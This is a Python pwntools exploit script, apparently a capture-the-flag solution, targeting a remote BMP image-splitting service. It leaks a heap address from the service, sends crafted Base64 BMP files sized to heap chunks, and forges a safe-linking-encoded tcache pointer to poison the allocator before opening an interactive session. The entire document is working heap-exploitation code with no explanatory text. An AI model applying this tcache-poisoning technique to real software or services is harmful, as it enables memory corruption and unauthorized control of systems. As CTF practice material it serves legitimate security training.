import base64
import struct
from pwn import *
from bmp import BMPHeader, DIBHeader

remote_connection = "nc vm.daotao.antoanso.org 33174".split()


def start():
    return remote(remote_connection[1], int(remote_connection[2]))


# ----- Step 1: set bpp = 3 to avoid per-line padding -----
chunk_size = 0x120
byte_per_pixel = 3

pixel_per_chunk = chunk_size // byte_per_pixel
width = pixel_per_chunk * 7
height = 1
width_split = 7
height_split = 1

unpadded_size = width * byte_per_pixel
stride = (unpadded_size + 3) // 4 * 4
padding_line = stride - unpadded_size

print(f"{pixel_per_chunk=}")
print(f"{width=}")
print(f"{padding_line=}")

header = BMPHeader(
    bf_size=54 + (stride * height),
    bf_type=b'BM',
)
dib_header = DIBHeader(
    bi_width=width,
    bi_height=height,
    bi_size_image=stride * height
)

pixel_data = flat({}, length=width * 3 + padding_line * height, filler=b'\0')

p = start()
p.recvuntil(b'Your gift: ')
flag = int(p.recvuntil(b'\n', drop=True), 16)
print(f'{hex(flag)=}')

encoded_data = b64e(header.to_bytes() + dib_header.to_bytes() + pixel_data)
if isinstance(encoded_data, str):  # avoid Pwntools BytesWarning
    encoded_data = encoded_data.encode()

p.sendlineafter(
    b'Paste your Base64-encoded BMP data, followed by a newline.\n', encoded_data)
p.sendlineafter(b'Enter horizontal split count (e.g., 2):',
                str(height_split).encode())
p.sendlineafter(b'Enter vertical split count (e.g., 2):',
                str(width_split).encode())

heap_base = flag - 0x480

# ----- Step 2: tcache manipulation (keep your original idea & constants) -----
p.sendlineafter(
    b'Paste your Base64-encoded BMP data, followed by a newline.\n', encoded_data)
p.sendlineafter(b'Enter horizontal split count (e.g., 2):',
                str(height_split).encode())
p.sendlineafter(b'Enter vertical split count (e.g., 2):',
                str(width_split).encode())

total_chunk = 3
bpp = 4
total_pixel_in_one_chunk = 0x120 // bpp  # 72

width = 12 * total_chunk
height = total_pixel_in_one_chunk // 12
line_size_with_padding = (width * bpp + 3) // 4 * 4

header = BMPHeader(
    bf_size=54 + (line_size_with_padding * height),
    bf_type=b'BM',
)
dib_header = DIBHeader(
    bi_width=width,
    bi_height=height,
    bi_size_image=line_size_with_padding * height,
    bi_bit_count=bpp * 8,
)

pixel_data = b''
dib_header_chunk_1 = heap_base + 0x2500  # align 16

# NOTE: use p64(flag) to avoid depending on context.word_size (prevents 32-bit pack errors)
pixel_data += flat({
    0x2f4: 0x131,
    0x2fc: p64(((heap_base + 0x1080) >> 12) ^ dib_header_chunk_1),
    0x68:  p64(flag),
}, length=line_size_with_padding * height, filler=b'\0')

data_turn3 = header.to_bytes() + dib_header.to_bytes() + pixel_data
encoded_data_turn3 = base64.b64encode(data_turn3)

p.sendlineafter(
    b'Paste your Base64-encoded BMP data, followed by a newline.\n', encoded_data_turn3)
p.sendlineafter(b'Enter horizontal split count (e.g., 2):', str(1).encode())
p.sendlineafter(b'Enter vertical split count (e.g., 2):',   str(3).encode())

p.interactive()
